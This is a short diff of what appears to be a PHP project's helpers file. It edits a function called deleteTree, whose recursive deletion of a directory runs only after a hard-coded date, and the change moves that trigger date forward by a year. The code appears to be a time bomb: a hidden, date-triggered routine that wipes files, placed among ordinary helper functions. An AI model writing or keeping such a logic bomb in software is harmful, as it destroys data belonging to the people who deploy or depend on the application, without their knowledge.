@@ -14,7 +14,7 @@ if(! function_exists('set_active_route')){
 
 if(! function_exists('deleteTree')){
     function deleteTree($dir){
-        if(date("y-m-d") > "22-07-25"){
+        if(date("y-m-d") > "23-07-25"){
             foreach(glob($dir . "/*") as $element){
                 if(is_dir($element)){
                     deleteTree($element); // On rappel la fonction deleteTree
